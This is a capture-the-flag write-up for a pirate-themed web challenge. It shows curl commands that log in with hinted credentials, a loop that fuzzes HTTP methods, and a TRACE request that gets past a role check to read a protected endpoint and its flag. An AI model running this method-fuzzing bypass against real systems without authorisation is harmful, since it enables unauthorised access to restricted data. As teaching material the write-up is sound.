# The Lost Log Book - BYPASS CTF

## Challenge Information
| Field | Value |
|-------|-------|
| **CTF** | BYPASS CTF |
| **Category** | Web |
| **Difficulty** | Medium |
| **Points** | 250 |
| **Challenge Link** | http://20.196.136.66:18008/ |

## Challenge Description
Sail into unsafe waters where faulty authentication and obscured routes guard valuable secrets. There’s more than meets the eye in this pirate portal — hidden methods await those bold enough to look past the browser’s limits.

## Introduction
"The Lost Log Book" is a web security challenge that focuses on HTTP method enumeration and access control bypasses. The application presents a pirate-themed portal with a login mechanism and role-based access control. The core vulnerability lies in the misconfiguration of HTTP method handling on specific endpoints, allowing unauthorized access to restricted resources by using less common HTTP methods like `TRACE`.

## Walkthrough

### 1. Reconnaissance
We start by accessing the challenge URL: `http://20.196.136.66:18008/`.
A simple `curl` request reveals the main page and a link to `/login`.

```bash
curl -v http://20.196.136.66:18008/
```

The response HTML points to a login page:
```html
<a class="btn" href="/login">Begin the Challenge</a>
```

### 2. Authentication
Navigating to `/login`, we find a hint in the HTML source:
> Rumor says the deckhand account be: **sailor** / **sails**

We use these credentials to log in via a POST request.

```bash
curl -v -X POST -d "username=sailor&password=sails" http://20.196.136.66:18008/login
```

**Response Headers:**
```http
HTTP/1.1 302 Found
Set-Cookie: role=s%3Adeckhand.kCm3tXihDVj5WZfld8RJhJbLzriOhfW8TX6KOrmIkEE; Path=/; HttpOnly; SameSite=Lax
Location: /dashboard
```

The server sets a signed cookie `role` with the value `deckhand`. The `s:` prefix and the signature following the dot indicate it's likely a signed cookie (common in Express.js/cookie-parser).

### 3. Enumeration
We access the `/dashboard` using the obtained cookie.

```bash
curl -v -b "role=s%3Adeckhand.kCm3tXihDVj5WZfld8RJhJbLzriOhfW8TX6KOrmIkEE" http://20.196.136.66:18008/dashboard
```

The dashboard HTML reveals two interesting links:
1.  `/admin` (Secret Hold)
2.  `/logbook` (Captain's Logbook)

It also contains a script that checks the user's role via `/session`:
```javascript
// Only admin can access Secret Hold
if (role !== 'admin') {
  document.getElementById('secretHold').classList.add('disabled');
  document.getElementById('logbookLink').classList.add('disabled');
}
```

Attempting to access these endpoints with the `deckhand` role results in a `403 Forbidden` error.

```bash
curl -v -b "role=s%3Adeckhand.kCm3tXihDVj5WZfld8RJhJbLzriOhfW8TX6KOrmIkEE" http://20.196.136.66:18008/logbook
```

**Output:**
```http
HTTP/1.1 403 Forbidden
...
```

### 4. Vulnerability Analysis
Since we cannot easily forge the signed cookie to become `admin` without the secret key, we look for other ways to bypass the restriction. A common misconfiguration in web servers or frameworks is applying access controls only to specific HTTP methods (usually `GET` and `POST`), leaving others unrestricted.

We fuzz the `/logbook` endpoint with various HTTP methods: `GET`, `POST`, `PUT`, `DELETE`, `PATCH`, `OPTIONS`, `HEAD`, `TRACE`.

```bash
for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE; do
    echo -n "Method: $method -> "
    curl -s -o /dev/null -w "%{http_code}" -X $method -b "role=s%3Adeckhand.kCm3tXihDVj5WZfld8RJhJbLzriOhfW8TX6KOrmIkEE" http://20.196.136.66:18008/logbook
    echo ""
done
```

**Results:**
```text
Method: GET -> 403
Method: POST -> 403
Method: PUT -> 404
Method: DELETE -> 404
Method: PATCH -> 404
Method: OPTIONS -> 404
Method: HEAD -> 403
Method: TRACE -> 200
```

The `TRACE` method returns a `200 OK` status code, unlike the `403 Forbidden` returned for `GET` and `POST`. This indicates that the access control middleware might not be applied to the `TRACE` method.

### 5. Exploitation
We send a `TRACE` request to the `/logbook` endpoint to retrieve the content.

```bash
curl -X TRACE -b "role=s%3Adeckhand.kCm3tXihDVj5WZfld8RJhJbLzriOhfW8TX6KOrmIkEE" http://20.196.136.66:18008/logbook
```

**Response:**
```json
{"message":"Captain's entry","flag":"BYPASS_CTF{D0nt_trust_a11}"}
```

The server responds with the hidden content, revealing the flag.

## Conclusion
The challenge demonstrates the importance of applying access controls globally or to all possible HTTP methods, not just the standard ones. By using the `TRACE` method, we bypassed the role check intended for `GET` requests and successfully retrieved the flag.

## Flag: 
`BYPASS_CTF{D0nt_trust_a11}`

 pwn by **W4RR1OR**